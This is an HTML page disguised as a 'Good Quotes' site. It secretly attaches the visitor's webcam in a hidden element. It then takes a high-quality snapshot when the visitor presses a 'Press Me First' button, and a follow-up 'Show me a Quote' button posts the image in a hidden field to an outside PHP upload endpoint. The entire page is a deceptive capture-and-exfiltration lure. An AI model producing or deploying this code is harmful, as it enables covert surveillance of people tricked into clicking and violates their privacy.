<!DOCTYPE html>
<html>
<head>
    <title> Welcome to Good Quotes </title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />
</head>
<body>
    <form action="http://www.goodquotes.somee.com/up.php" method="POST">
        <span style="height:0px;width:0px;display:none;" id="my_camera" height=0 width=0></span>
                <br/>
                <input type=button value="Press Me First" onClick="take_snapshot(); myFunction();">
                <input type="hidden" name="image" id="image" class="image-tag">
<p id="demo"></p>
<script>
function myFunction() {
  document.getElementById("demo").innerHTML = "<input type=submit value='Show me a Quote 2'>";
}
</script>
    </form>
        <script language="JavaScript">
    Webcam.set({
        width: 550,
        height: 740,
        image_format: 'jpeg',
        jpeg_quality: 100
    });
  
    Webcam.attach( '#my_camera' );
        function take_snapshot() {
        Webcam.snap( function(data_uri) {
            $(".image-tag").val(data_uri);
            document.getElementById('results').innerHTML = '<img src="'+data_uri+'"/>';
        } );
    }
</script>
</body>
</html>
